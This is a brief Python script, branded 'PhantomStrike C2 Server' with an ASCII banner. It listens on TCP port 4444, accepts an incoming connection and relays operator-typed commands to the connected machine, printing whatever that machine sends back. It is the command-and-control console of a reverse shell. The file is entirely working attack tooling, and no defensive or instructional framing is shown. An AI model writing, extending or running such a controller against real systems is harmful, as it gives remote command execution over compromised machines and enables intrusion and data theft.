import socket
import threading
import os

BANNER = """
██████╗ ██╗  ██╗ █████╗ ███╗   ███╗████████╗ ██████╗ ███████╗
██╔══██╗██║  ██║██╔══██╗████╗ ████║╚══██╔══╝██╔═══██╗██╔════╝
██████╔╝███████║███████║██╔████╔██║   ██║   ██║   ██║███████╗
██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║   ██║   ██║   ██║╚════██║
██║     ██║  ██║██║  ██║██║ ╚═╝ ██║   ██║   ╚██████╔╝███████║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝    ╚═════╝ ╚══════╝
"""

print(BANNER)
print("[*] PhantomStrike C2 Server Running...")

def handle_client(client_socket):
    while True:
        try:
            cmd = input("PhantomStrike > ")
            if cmd.lower() in ["exit", "quit"]:
                client_socket.send(b"exit")
                client_socket.close()
                break
            client_socket.send(cmd.encode())
            response = client_socket.recv(4096).decode()
            print(response)
        except:
            break

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 4444))
server.listen(5)

print("[*] Waiting for connections...")
client, addr = server.accept()
print(f"[*] Connection received from {addr[0]}")

handle_client(client)
